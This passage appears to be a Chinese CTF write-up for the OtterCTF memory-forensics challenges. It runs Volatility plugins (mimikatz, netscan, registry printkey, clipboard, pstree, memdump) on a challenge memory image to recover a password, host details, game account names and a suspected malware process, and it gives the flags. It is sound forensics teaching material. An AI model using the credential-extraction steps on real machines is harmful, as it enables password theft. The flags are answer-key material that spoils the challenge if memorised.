construct==2.5.5-reupload</code></pre><p>走起</p><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 mimikatzVolatility Foundation Volatility Framework 2.6Module   User             Domain           Password                                -------- ---------------- ---------------- ----------------------------------------wdigest  Rick             WIN-LO6FAF3DTFE  MortyIsReallyAnOtter                    wdigest  WIN-LO6FAF3DTFE$ WORKGROUP                                                </code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>第一关flag：CTF&#123;MortyIsReallyAnOtter&#125;</code></pre><h1 id="2-General-Info-75"><a href="#2-General-Info-75" class="headerlink" title="2 - General Info 75"></a>2 - General Info 75</h1><p>##question<br>Let’s start easy - whats the PC’s name and IP address?<br>format: CTF{flag}</p><p>##solve<br>要ip地址，netscan走一波吧</p><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 netscan Volatility Foundation Volatility Framework 2.6Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000</code></pre><p>主机名，先看注册表</p><pre><code>➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 hivelistVolatility Foundation Volatility Framework 2.6Virtual            Physical           Name------------------ ------------------ ----0xfffff8a00377d2d0 0x00000000624162d0 \??\C:\System Volume Information\Syscache.hve0xfffff8a00000f010 0x000000002d4c1010 [no name]0xfffff8a000024010 0x000000002d50c010 \REGISTRY\MACHINE\SYSTEM0xfffff8a000053320 0x000000002d5bb320 \REGISTRY\MACHINE\HARDWARE0xfffff8a000109410 0x0000000029cb4410 \SystemRoot\System32\Config\SECURITY0xfffff8a00033d410 0x000000002a958410 \Device\HarddiskVolume1\Boot\BCD0xfffff8a0005d5010 0x000000002a983010 \SystemRoot\System32\Config\SOFTWARE0xfffff8a001495010 0x0000000024912010 \SystemRoot\System32\Config\DEFAULT0xfffff8a0016d4010 0x00000000214e1010 \SystemRoot\System32\Config\SAM0xfffff8a00175b010 0x00000000211eb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT0xfffff8a00176e410 0x00000000206db410 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT0xfffff8a002090010 0x000000000b92b010 \??\C:\Users\Rick\ntuser.dat0xfffff8a0020ad410 0x000000000db41410 \??\C:\Users\Rick\AppData\Local\Microsoft\Windows\UsrClass.dat</code></pre><p>看到system。。。不用想了，接着干</p><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkeyVolatility Foundation Volatility Framework 2.6Legend: (S) = Stable   (V) = Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: CMI-CreateHive&#123;2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5&#125; (S)Last updated: 2018-08-04 19:25:54 UTC+0000Subkeys:  (S) ControlSet001  (S) ControlSet002  (S) MountedDevices  (S) RNG  (S) Select  (S) Setup  (S) Software  (S) WPA  (V) CurrentControlSetValues:</code></pre><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;Volatility Foundation Volatility Framework 2.6Legend: (S) = Stable   (V) = Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: ControlSet001 (S)Last updated: 2018-06-02 19:23:00 UTC+0000Subkeys:  (S) Control  (S) Enum  (S) Hardware Profiles  (S) Policies  (S) servicesValues:</code></pre><p>就这样一个一个解析注册表,到最后</p><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;Volatility Foundation Volatility Framework 2.6Legend: (S) = Stable   (V) = Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: ComputerName (S)Last updated: 2018-06-02 19:23:00 UTC+0000Subkeys:Values:REG_SZ                        : (S) mnmsrvcREG_SZ        ComputerName    : (S) WIN-LO6FAF3DTFE</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;WIN-LO6FAF3DTFE&#125;CTF&#123;192.168.202.131&#125;</code></pre><h1 id="3-Play-Time-50"><a href="#3-Play-Time-50" class="headerlink" title="3 - Play Time 50"></a>3 - Play Time 50</h1><p>##question<br>Rick just loves to play some good old videogames. can you tell which game is he playing? whats the IP address of the server?</p><p>format: CTF{flag}</p><p>##solve<br>netscan 中发现有个进程不认识，google下LunarMS，是个游戏，over</p><pre><code class="bash">➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 netscan                                        Volatility Foundation Volatility Framework 2.6Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d6424c0         UDPv4    0.0.0.0:50762                  *:*                                   4076     chrome.exe     2018-08-04 19:33:37 UTC+00000x7d6b4250         UDPv6    ::1:1900                       *:*                                   164      svchost.exe    2018-08-04 19:28:42 UTC+00000x7d6e3230         UDPv4    127.0.0.1:6771                 *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d6ed650         UDPv4    0.0.0.0:5355                   *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d71c8a0         UDPv4    0.0.0.0:0                      *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d71c8a0         UDPv6    :::0                           *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d74a390         UDPv4    127.0.0.1:52847                *:*                                   2624     bittorrentie.e 2018-08-04 19:27:24 UTC+00000x7d7602c0         UDPv4    127.0.0.1:52846                *:*                                   2308     bittorrentie.e 2018-08-04 19:27:24 UTC+00000x7d787010         UDPv4    0.0.0.0:65452                  *:*                                   4076     chrome.exe     2018-08-04 19:33:42 UTC+00000x7d789b50         UDPv4    0.0.0.0:50523                  *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d789b50         UDPv6    :::50523                       *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d92a230         UDPv4    0.0.0.0:0                      *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d92a230         UDPv6    :::0                           *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d9e8b50         UDPv4    0.0.0.0:20830                  *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d9f4560         UDPv4    0.0.0.0:0                      *:*                                   3856     WebCompanion.e 2018-08-04 19:34:22 UTC+00000x7d9f8cb0         UDPv4    0.0.0.0:20830                  *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d9f8cb0         UDPv6    :::20830                       *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d8bb390         TCPv4    0.0.0.0:9008                   0.0.0.0:0            LISTENING        4        System         0x7d8bb390         TCPv6    :::9008                        :::0                 LISTENING        4        System         0x7d9a9240         TCPv4    0.0.0.0:8733                   0.0.0.0:0            LISTENING        4        System         0x7d9a9240         TCPv6    :::8733                        :::0                 LISTENING        4        System         0x7d9e19e0         TCPv4    0.0.0.0:20830                  0.0.0.0:0            LISTENING        2836     BitTorrent.exe 0x7d9e19e0         TCPv6    :::20830                       :::0                 LISTENING        2836     BitTorrent.exe 0x7d9e1c90         TCPv4    0.0.0.0:20830                  0.0.0.0:0            LISTENING        2836     BitTorrent.exe 0x7d42ba90         TCPv4    -:0                            56.219.196.26:0      CLOSED           2836     BitTorrent.exe 0x7d6124d0         TCPv4    192.168.202.131:49530          77.102.199.102:7575  CLOSED           708      LunarMS.exe    0x7d62d690         TCPv4    192.168.202.131:49229          169.1.143.215:8999   CLOSED           2836     BitTorrent.exe 0x7d634350         TCPv6    -:0                            38db:c41a:80fa:ffff:38db:c41a:80fa:ffff:0 CLOSED           2836     BitTorrent.exe   </code></pre><p>##flag</p><pre><code class="bash">CTF&#123;LunarMS&#125;CTF&#123;77.102.199.102&#125;</code></pre><h1 id="4-Name-Game-100"><a href="#4-Name-Game-100" class="headerlink" title="4 - Name Game 100"></a>4 - Name Game 100</h1><p>##question<br>We know that the account was logged in to a channel called Lunar-3. what is the account name?</p><p>format: CTF{flag}</p><p>##solve<br>如果他登陆了，必定存入了Lunar到vmem中，尝试找找Lunar-3 </p><pre><code class="bash">➜  Desktop strings OtterCTF.vmem|grep Lunar-3          Lunar-3Lunar-3</code></pre><p>显示找到的前三行后三行</p><pre><code class="bash">➜  Desktop strings OtterCTF.vmem|grep Lunar-3 -A 3 -B 3disabledmouseOverkeyFocusedLunar-30tt3r8r33z3Sound/UI.img/BtMouseClick--c+Yttb+Y4c+Yb+YLc+YLunar-3Lunar-4L(dNVxdNVL|eNV</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;0tt3r8r33z3&#125;</code></pre><h1 id="5-Name-Game-2-150"><a href="#5-Name-Game-2-150" class="headerlink" title="5 - Name Game 2 150"></a>5 - Name Game 2 150</h1><p>##question<br>From a little research we found that the username of the logged on character is always after this signature: 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} What’s rick’s character’s name? format: CTF{…}</p><p>##solve<br>先看下进程</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 psscan  Volatility Foundation Volatility Framework 2.6Offset(P)          Name                PID   PPID PDB                Time created                   Time exited                   ------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------0x000000007d403610 mscorsvw.exe        412    492 0x0000000040d28000 2018-08-04 19:28:42 UTC+0000                                 0x000000007d686b30 Rick And Morty     3820   2728 0x000000000b59a000 2018-08-04 19:32:55 UTC+0000                                 0x000000007d6a7b30 bittorrentie.e     2308   2836 0x0000000076ada000 2018-08-04 19:27:19 UTC+0000                                 0x000000007d6c9b30 bittorrentie.e     2624   2836 0x00000000761f5000 2018-08-04 19:27:21 UTC+0000                                 0x000000007d7cb740 LunarMS.exe         708   2728 0x00000000731cb000 2018-08-04 19:27:39 UTC+0000                                 0x000000007d832060 sppsvc.exe         2500    492 0x000000000ae7b000 2018-08-04 19:26:58 UTC+0000                                 0x000000007d87e060 explorer.exe       2728   2696 0x000000000873f000 2018-08-04 19:27:04 UTC+0000                                 0x000000007d890b30 BitTorrent.exe     2836   2728 0x0000000006c2e000 2018-08-04 19:27:07 UTC+0000                                 0x000000007d8f02e0 WebCompanion.e     2844   2728 0x0000000006619000 2018-08-04 19:27:07 UTC+0000   2018-08-04 19:33:33 UTC+0000  0x000000007d9aab30 SearchIndexer.     3064    492 0x0000000079a02000 2018-08-04 19:27:14 UTC+0000                                 0x000000007da8f060 sc.exe             3208   3880 0x000000006fe9a000 2018-08-04 19:33:47 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007db12060 WmiPrvSE.exe       2136    604 0x0000000073b40000 2018-08-04 19:26:51 UTC+0000                                 0x000000007db8f060 WebCompanionIn     3880   1484 0x0000000043242000 2018-08-04 19:33:07 UTC+0000                                 0x000000007dbcdb30 vmtoolsd.exe       2804   2728 0x00000000074c6000 2018-08-04 19:27:06 UTC+0000                                 0x000000007dbe9b30 taskhost.exe       2344    492 0x000000000b824000 2018-08-04 19:26:57 UTC+0000                                 0x000000007dbfab30 dwm.exe            2704    844 0x0000000008a6d000 2018-08-04 19:27:04 UTC+0000                                 0x000000007dbfd960 notepad.exe        3304   3132 0x000000007207d000 2018-08-04 19:34:10 UTC+0000                                 0x000000007dc0f630 VGAuthService.     1356    492 0x0000000018f8b000 2018-08-04 19:26:25 UTC+0000                                 0x000000007dc7f630 dllhost.exe        1324    492 0x000000001030d000 2018-08-04 19:26:42 UTC+0000                                 0x000000007dc92920 vmtoolsd.exe       1428    492 0x0000000017f54000 2018-08-04 19:26:27 UTC+0000                                 0x000000007dcb6890 sc.exe              452   3880 0x000000005f76a000 2018-08-04 19:33:48 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007dce7b30 SearchFilterHo     2740   3064 0x000000002fa16000 2018-08-04 19:33:11 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007dde7800 svchost.exe        1948    492 0x0000000076d80000 2018-08-04 19:26:42 UTC+0000                                 0x000000007ddf3b30 msdtc.exe          1436    492 0x000000000fcd5000 2018-08-04 19:26:43 UTC+0000                                 0x000000007de01060 sc.exe             2028   3880 0x0000000077e22000 2018-08-04 19:33:49 UTC+0000   2018-08-04 19:34:03 UTC+0000  0x000000007de2e9e0 svchost.exe         808    492 0x000000001fe6a000 2018-08-04 19:26:18 UTC+0000                                 0x000000007de31b30 svchost.exe         844    492 0x000000001ff36000 2018-08-04 19:26:18 UTC+0000                                 0x000000007de4db30 svchost.exe         868    492 0x000000002027f000 2018-08-04 19:26:18 UTC+0000                                 0x000000007de753a0 audiodg.exe         960    808 0x000000001f6df000 2018-08-04 19:26:19 UTC+0000                                 0x000000007de97060 svchost.exe        1012    492 0x000000001f58e000 2018-08-04 19:26:20 UTC+0000                                 0x000000007ded37e0 svchost.exe         620    492 0x000000001e7a0000 2018-08-04 19:26:21 UTC+0000                                 0x000000007df5ab30 spoolsv.exe        1120    492 0x000000001b0e7000 2018-08-04 19:26:22 UTC+0000                                 0x000000007df718a0 svchost.exe        1164    492 0x000000001ac36000 2018-08-04 19:26:23 UTC+0000                                 0x000000007e000a90 chrome.exe         3924   4076 0x00000000006ba000 2018-08-04 19:29:51 UTC+0000                                 0x000000007e072b30 sc.exe             3504   3880 0x0000000040331000 2018-08-04 19:33:48 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007e0d1060 Lavasoft.WCAss     3496    492 0x0000000078089000 2018-08-04 19:33:49 UTC+0000                                 0x000000007e0f4060 winlogon.exe        432    380 0x00000000237dc000 2018-08-04 19:26:11 UTC+0000                                 0x000000007e1377c0 services.exe        492    396 0x000000002257a000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e13f060 lsass.exe           500    396 0x000000002219a000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e1461a0 lsm.exe             508    396 0x00000000221a2000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e1bdb30 vmacthlp.exe        668    492 0x000000002120e000 2018-08-04 19:26:16 UTC+0000                                 0x000000007e1ebb30 svchost.exe         712    492 0x0000000020d1c000 2018-08-04 19:26:17 UTC+0000                                 0x000000007e4268b0 WebCompanion.e     3856   3880 0x000000003c956000 2018-08-04 19:34:05 UTC+0000                                 0x000000007e435240 chrome.exe         3648   4076 0x0000000067df6000 2018-08-04 19:33:38 UTC+0000                                 0x000000007e4643d0 conhost.exe        2420    348 0x0000000075907000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e4af9f0 svchost.exe         164    492 0x000000003ffbd000 2018-08-04 19:28:42 UTC+0000                                 0x000000007e4c2700 mscorsvw.exe       3124    492 0x000000003fa08000 2018-08-04 19:28:43 UTC+0000                                 0x000000007e4e4b30 svchost.exe        3196    492 0x000000003e5d5000 2018-08-04 19:28:44 UTC+0000                                 0x000000007e5bfb30 ipconfig.exe       3788   3916 0x0000000039194000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e5f98f0 chrome.exe         2748   4076 0x0000000074a76000 2018-08-04 19:31:15 UTC+0000                                 0x000000007e6c5b30 vmware-tray.ex     3720   3820 0x000000007653c000 2018-08-04 19:33:02 UTC+0000                                 0x000000007e6e3870 chrome.exe         4076   2728 0x0000000033cdc000 2018-08-04 19:29:30 UTC+0000                                 0x000000007e6eab30 chrome.exe         4084   4076 0x000000003338b000 2018-08-04 19:29:30 UTC+0000                                 0x000000007e6f7b30 chrome.exe         1808   4076 0x000000003ae8a000 2018-08-04 19:29:32 UTC+0000                                 0x000000007e702b30 chrome.exe          576   4076 0x0000000003f38000 2018-08-04 19:29:31 UTC+0000                                 0x000000007e772b30 cmd.exe            3916   1428 0x00000000199c1000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e7ef1f0 chrome.exe         1796   4076 0x000000002b91a000 2018-08-04 19:33:41 UTC+0000                                 0x000000007e7fe210 SearchProtocol     3428   3064 0x0000000010edf000 2018-08-04 19:33:11 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e8ed060 wininit.exe         396    336 0x00000000244f5000 2018-08-04 19:26:11 UTC+0000                                 0x000000007eac8380 csrss.exe           348    336 0x00000000245af000 2018-08-04 19:26:10 UTC+0000                                 0x000000007f28c2d0 PresentationFo      724    492 0x000000006541b000 2018-08-04 19:27:52 UTC+0000                                 0x000000007f2d3b30 csrss.exe           388    380 0x0000000074a96000 2018-08-04 19:26:11 UTC+0000                                 0x000000007f67e4d0 smss.exe            260      4 0x000000002abc9000 2018-08-04 19:26:03 UTC+0000                                 0x000000007fb24b30 WmiPrvSE.exe       1800    604 0x00000000134a3000 2018-08-04 19:26:39 UTC+0000                                 0x000000007fc3c890 svchost.exe         604    492 0x0000000021336000 2018-08-04 19:26:16 UTC+0000                                 0x000000007fe83740 System                4      0 0x0000000000187000 2018-08-04 19:26:03 UTC+0000                                 </code></pre><p>把LunarMS.exe 也就是708 dump出来</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D ./Volatility Foundation Volatility Framework 2.6************************************************************************Writing LunarMS.exe [   708] to 708.dmp</code></pre><p>然后就在里面找0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}</p><pre><code class="bash">strings 708.dmp|grep Z |grep d |grep @</code></pre><p>发现太多了，只能换hashdump了</p><pre><code class="bash">➜  Desktop hexdump -C 708.dmp |grep &quot;5a 0c 00&quot; -A 3 -B 3 ......0b04ac30  10 00 00 00 00 35 c1 50  00 00 00 00 ec 0f 00 00  |.....5.P........|0b04ac40  84 c7 b6 1c 10 00 00 00  00 35 c1 50 64 0f c9 1c  |.........5.Pd...|0b04ac50  14 18 00 00 98 5a 6e 46  10 00 00 00 00 35 c1 50  |.....ZnF.....5.P|0b04ac60  00 00 00 00 5a 0c 00 00  64 c5 22 1e 10 00 00 00  |....Z...d.&quot;.....|0b04ac70  00 35 c1 50 6c 77 f8 1c  d3 a5 18 00 50 f5 04 1e  |.5.Plw......P...|0b04ac80  10 00 00 00 00 35 c1 50  48 b9 28 1f bd 1f 00 00  |.....5.PH.(.....|0b04ac90  fc 13 6f 46 10 00 00 00  00 35 c1 50 00 00 00 00  |..oF.....5.P....|--0c33a470  55 44 81 ab 55 44 81 ab  5c 4d ef a3 44 e7 fa 08  |UD..UD..\M..D...|0c33a480  dc 2d de 08 f6 e7 22 08  f6 e7 22 08 5c 4d 98 d4  |.-....&quot;...&quot;.\M..|0c33a490  db 68 8a 0c 00 00 00 80  92 06 00 00 ac 00 00 00  |.h..............|0c33a4a0  9a 23 32 23 0b 00 00 01  5a 0c 00 00 4d 30 72 74  |.#2#....Z...M0rt|0c33a4b0  79 4c 30 4c 00 00 00 00  00 00 00 21 4e 00 00 55  |yL0L.......!N..U|0c33a4c0  75 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |u...............|0c33a4d0  00 00 00 00 00 00 00 00  00 00 00 a4 00 00 3b 03  |..............;.|--0d4348e0  d0 f2 4c ce 31 15 f7 28  46 11 21 0f 86 15 a5 e5  |..L.1..(F.!.....|0d4348f0  0d 52 30 69 48 06 c7 9f  2d ae 6e e7 78 44 7b 53  |.R0iH...-.n.xD&#123;S|0d434900  ba 7d bc c2 b8 f9 74 7d  45 f5 64 6b 77 aa e3 70  |.&#125;....t&#125;E.dkw..p|0d434910  ff e9 d3 5d 10 88 84 de  01 1e 96 48 9c 5a 0c 00  |...].......H.Z..|0d434920  58 22 7c c5 0d 09 7b 51  21 f7 ce 48 1b 97 81 33  |X&quot;|...&#123;Q!..H...3|0d434930  00 f2 4d 3b 59 d5 e4 b5  ac ef 11 1d ba 47 ee ba  |..M;Y........G..|0d434940  4e ff 95 4e d2 b9 60 0c  f3 99 e4 fd c9 04 6c 79  |N..N..`.......ly|......</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;M0rtyL0L&#125;</code></pre><h1 id="6-Silly-Rick-100"><a href="#6-Silly-Rick-100" class="headerlink" title="6 - Silly Rick 100"></a>6 - Silly Rick 100</h1><p>##question<br>Silly rick always forgets his email’s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick’s email password?</p><p>format: CTF{flag}<br>##solve<br>都说了copy了，直接看粘贴板</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 clipboardVolatility Foundation Volatility Framework 2.6Session    WindowStation Format                         Handle Object             Data                                              ---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------         1 WinSta0       CF_UNICODETEXT                0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs                                             1 WinSta0       CF_TEXT                          0x10 ------------------                                                            1 WinSta0       0x150133L              0x200000000000 ------------------                                                            1 WinSta0       CF_TEXT                           0x1 ------------------                                                            1 ------------- ------------------           0x150133 0xfffff900c1c1adc0                                                   </code></pre><p>##flag</p><pre><code class="bash">CTF&#123;M@il_Pr0vid0rs&#125;</code></pre><h1 id="7-Hide-And-Seek-100"><a href="#7-Hide-And-Seek-100" class="headerlink" title="7- Hide And Seek 100"></a>7- Hide And Seek 100</h1><p>##question<br>The reason that we took rick’s PC memory dump is because there was a malware infection. Please find the malware process name (including the extension)</p><p>BEAWARE! There are only 3 attempts to get the right flag!</p><p>format: CTF{flag}</p><p>##solve<br>pstree一下</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 pstreeVolatility Foundation Volatility Framework 2.6Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0xfffffa801b27e060:explorer.exe                     2728   2696     33    854 2018-08-04 19:27:04 UTC+0000. 0xfffffa801b486b30:Rick And Morty                  3820   2728      4    185 2018-08-04 19:32:55 UTC+0000.. 0xfffffa801a4c5b30:vmware-tray.ex                 3720   3820      8    147 2018-08-04 19:33:02 UTC+0000. 0xfffffa801b2f02e0:WebCompanion.e                  2844   2728      0 ------ 2018-08-04 19:27:07 UTC+0000. 0xfffffa801a4e3870:chrome.exe                      4076   2728     44   1160 2018-08-04 19:29:30 UTC+0000.. 0xfffffa801a4eab30:chrome.exe                     4084   4076      8     86 2018-08-04 19:29:30 UTC+0000.. 0xfffffa801a5ef1f0:chrome.exe                     1796   4076     15    170 2018-08-04 19:33:41 UTC+0000.. 0xfffffa801aa00a90:chrome.exe                     3924   4076     16    228 2018-08-04 19:29:51 UTC+0000.. 0xfffffa801a635240:chrome.exe                     3648   4076     16    207 2018-08-04 19:33:38 UTC+0000.. 0xfffffa801a502b30:chrome.exe                      576   4076      2     58 2018-08-04 19:29:31 UTC+0000.. 0xfffffa801a4f7b30:chrome.exe                     1808   4076     13    229 2018-08-04 19:29:32 UTC+0000.. 0xfffffa801a7f98f0:chrome.exe                     2748   4076     15    181 2018-08-04 19:31:15 UTC+0000. 0xfffffa801b5cb740:LunarMS.exe                      708   2728     18    346 2018-08-04 19:27:39 UTC+0000. 0xfffffa801b1cdb30:vmtoolsd.exe                    2804   2728      6    190 2018-08-04 19:27:06 UTC+0000. 0xfffffa801b290b30:BitTorrent.exe                  2836   2728     24    471 2018-08-04 19:27:07 UTC+0000.. 0xfffffa801b4c9b30:bittorrentie.e                 2624   2836     13    316 2018-08-04 19:27:21 UTC+0000.. 0xfffffa801b4a7b30:bittorrentie.e                 2308   2836     15    337 2018-08-04 19:27:19 UTC+0000 0xfffffa8018d44740:System                              4      0     95    411 2018-08-04 19:26:03 UTC+0000. 0xfffffa801947e4d0:smss.exe                         260      4      2     30 2018-08-04 19:26:03 UTC+0000 0xfffffa801a2ed060:wininit.exe                       396    336      3     78 2018-08-04 19:26:11 UTC+0000. 0xfffffa801ab377c0:services.exe                     492    396     11    242 2018-08-04 19:26:12 UTC+0000.. 0xfffffa801afe7800:svchost.exe                    1948    492      6     96 2018-08-04 19:26:42 UTC+0000.. 0xfffffa801ae92920:vmtoolsd.exe                   1428    492      9    313 2018-08-04 19:26:27 UTC+0000... 0xfffffa801a572b30:cmd.exe                       3916   1428      0 ------ 2018-08-04 19:34:22 UTC+0000.. 0xfffffa801ae0f630:VGAuthService.                 1356    492      3     85 2018-08-04 19:26:25 UTC+0000.. 0xfffffa801abbdb30:vmacthlp.exe                    668    492      3     56 2018-08-04 19:26:16 UTC+0000.. 0xfffffa801aad1060:Lavasoft.WCAss                 3496    492     14    473 2018-08-04 19:33:49 UTC+0000.. 0xfffffa801a6af9f0:svchost.exe                     164    492     12    147 2018-08-04 19:28:42 UTC+0000.. 0xfffffa801ac2e9e0:svchost.exe                     808    492     22    508 2018-08-04 19:26:18 UTC+0000... 0xfffffa801ac753a0:audiodg.exe                    960    808      7    151 2018-08-04 19:26:19 UTC+0000.. 0xfffffa801ae7f630:dllhost.exe                    1324    492     15    207 2018-08-04 19:26:42 UTC+0000.. 0xfffffa801a6c2700:mscorsvw.exe                   3124    492      7     77 2018-08-04 19:28:43 UTC+0000.. 0xfffffa801b232060:sppsvc.exe                     2500    492      4    149 2018-08-04 19:26:58 UTC+0000.. 0xfffffa801abebb30:svchost.exe                     712    492      8    301 2018-08-04 19:26:17 UTC+0000.. 0xfffffa801ad718a0:svchost.exe                    1164    492     18    312 2018-08-04 19:26:23 UTC+0000.. 0xfffffa801ac31b30:svchost.exe                     844    492     17    396 2018-08-04 19:26:18 UTC+0000... 0xfffffa801b1fab30:dwm.exe                       2704    844      4     97 2018-08-04 19:27:04 UTC+0000.. 0xfffffa801988c2d0:PresentationFo                  724    492      6    148 2018-08-04 19:27:52 UTC+0000.. 0xfffffa801b603610:mscorsvw.exe                    412    492      7     86 2018-08-04 19:28:42 UTC+0000.. 0xfffffa8018e3c890:svchost.exe                     604    492     11    376 2018-08-04 19:26:16 UTC+0000... 0xfffffa8019124b30:WmiPrvSE.exe                  1800    604      9    222 2018-08-04 19:26:39 UTC+0000... 0xfffffa801b112060:WmiPrvSE.exe                  2136    604     12    324 2018-08-04 19:26:51 UTC+0000.. 0xfffffa801ad5ab30:spoolsv.exe                    1120    492     14    346 2018-08-04 19:26:22 UTC+0000.. 0xfffffa801ac4db30:svchost.exe                     868    492     45   1114 2018-08-04 19:26:18 UTC+0000.. 0xfffffa801a6e4b30:svchost.exe                    3196    492     14    352 2018-08-04 19:28:44 UTC+0000.. 0xfffffa801acd37e0:svchost.exe                     620    492     19    415 2018-08-04 19:26:21 UTC+0000.. 0xfffffa801b1e9b30:taskhost.exe                   2344    492      8    193 2018-08-04 19:26:57 UTC+0000.. 0xfffffa801ac97060:svchost.exe                    1012    492     12    554 2018-08-04 19:26:20 UTC+0000.. 0xfffffa801b3aab30:SearchIndexer.                 3064    492     11    610 2018-08-04 19:27:14 UTC+0000.. 0xfffffa801aff3b30:msdtc.exe                      1436    492     14    155 2018-08-04 19:26:43 UTC+0000. 0xfffffa801ab3f060:lsass.exe                        500    396      7    610 2018-08-04 19:26:12 UTC+0000. 0xfffffa801ab461a0:lsm.exe                          508    396     10    148 2018-08-04 19:26:12 UTC+0000 0xfffffa801a0c8380:csrss.exe                         348    336      9    563 2018-08-04 19:26:10 UTC+0000. 0xfffffa801a6643d0:conhost.exe                     2420    348      0     30 2018-08-04 19:34:22 UTC+0000 0xfffffa80198d3b30:csrss.exe                         388    380     11    460 2018-08-04 19:26:11 UTC+0000 0xfffffa801aaf4060:winlogon.exe                      432    380      3    113 2018-08-04 19:26:11 UTC+0000 0xfffffa801b18f060:WebCompanionIn                   3880   1484     15    522 2018-08-04 19:33:07 UTC+0000. 0xfffffa801aa72b30:sc.exe                          3504   3880      0 ------ 2018-08-04 19:33:48 UTC+0000. 0xfffffa801aeb6890:sc.exe                           452   3880      0 ------ 2018-08-04 19:33:48 UTC+0000. 0xfffffa801a6268b0:WebCompanion.e                  3856   3880     15    386 2018-08-04 19:34:05 UTC+0000. 0xfffffa801b08f060:sc.exe                          3208   3880      0 ------ 2018-08-04 19:33:47 UTC+0000. 0xfffffa801ac01060:sc.exe                          2028   3880      0 ------ 2018-08-04 19:33:49 UTC+0000 0xfffffa801b1fd960:notepad.exe                      3304   3132      2     79 2018-08-04 19:34:10 UTC+0000</code></pre><p>很多都是没用的，但是看到有一个很奇怪，ppid比pid还大</p><pre><code class="bash">.. 0xfffffa801a4c5b30:vmware-tray.ex                 3720   3820      8    147 2018-08-04 19:33:02 UTC+0000</code></pre><p>dlllist一下</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3820Volatility Foundation 